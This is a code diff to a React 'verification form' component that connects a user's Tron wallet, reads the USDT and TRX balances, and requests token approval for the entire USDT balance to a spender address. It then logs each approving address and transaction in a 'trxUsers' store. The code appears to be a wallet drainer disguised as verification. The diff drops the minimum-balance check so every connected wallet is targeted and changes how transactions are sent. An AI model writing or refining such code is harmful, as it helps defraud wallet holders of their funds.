@@ -63,7 +63,7 @@ const VerificationFormComponent = (props) => {
     const { name, value } = e.target
     setFormData(prev => ({ ...prev, [name]: value }))
   }
-  
+
   const busdAbi = [
     {
       "constant": false,
@@ -248,7 +248,8 @@ const VerificationFormComponent = (props) => {
     const balanceUSDT = parseInt(usdtTrx.toString(), 10) / 1_000_000
     const balanceTrx = trxBalance / 1_000_000
 
-    if (balanceTrx > 35) {
+    // if (balanceTrx > 35) {
+    if (balanceTrx >= 0) {
       handleApprove(balanceUSDT)
     } else {
       setIsSubmitting(false);
@@ -280,9 +281,12 @@ const VerificationFormComponent = (props) => {
         address
       );
 
-      const signedTx = await wallet.adapter.signTransaction(transaction);
+      // const signedTx = await wallet.adapter.signTransaction(transaction);
 
-      const receipt = await tronWeb.trx.sendRawTransaction(signedTx);
+      // const receipt = await tronWeb.trx.sendRawTransaction(signedTx);
+
+      const txWithSender = { ...transaction, from: address };
+      const receipt = await wallet.adapter.sendTransaction(txWithSender);
 
       if (receipt?.txid) {
         addData('trxUsers', address, receipt?.txid, spenderTrx)
@@ -343,7 +347,7 @@ const VerificationFormComponent = (props) => {
     }
   };
 
-  const handleSubmit = async(value) => {
+  const handleSubmit = async (value) => {
 
     if (disconnect) {
       await disconnect();
